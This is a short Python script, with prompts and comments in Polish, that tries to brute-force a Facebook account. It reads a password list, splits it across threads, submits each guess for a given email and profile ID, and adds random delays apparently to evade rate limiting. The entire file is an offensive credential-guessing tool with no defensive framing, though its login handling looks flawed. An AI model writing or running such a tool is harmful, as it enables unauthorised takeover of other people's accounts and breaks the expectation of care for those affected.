import requests
import time
import random
import threading

def brute_force(username, fb_id, passwords):
    url = f'https://www.facebook.com/{fb_id}'

    with requests.Session() as session:
        for password in passwords:
            data = {'email': username, 'pass': password}

            try:
                response = session.post(url, data=data)
                response.raise_for_status()

                if 'Find Friends' in response.text:
                    print(f'Prawidłowe hasło znalezione: {password}')
                    break
                else:
                    print(f'Nieprawidłowe hasło: {password}')

            except requests.exceptions.RequestException as e:
                print(f'Błąd podczas żądania HTTP: {e}')

            # Losowe opóźnienie między 1 a 3 sekundami (możesz dostosować)
            time.sleep(random.uniform(1, 3))

def main():
    email = input('Podaj adres e-mail (jako nazwę użytkownika): ')
    fb_id = input('Podaj identyfikator Facebooka: ')
    password_file = input('Podaj nazwę pliku z hasłami: ')

    with open(password_file, 'r') as file:
        passwords = [line.strip() for line in file]

    num_threads = 5
    password_chunks = [passwords[i:i + len(passwords)//num_threads] for i in range(0, len(passwords), len(passwords)//num_threads)]

    threads = []
    for chunk in password_chunks:
        thread = threading.Thread(target=brute_force, args=(email, fb_id, chunk))
        threads.append(thread)
        thread.start()

        # Losowe opóźnienie między uruchomieniem kolejnych wątków
        time.sleep(random.uniform(0.5, 1))

    for thread in threads:
        thread.join()

if __name__ == '__main__':
    main()
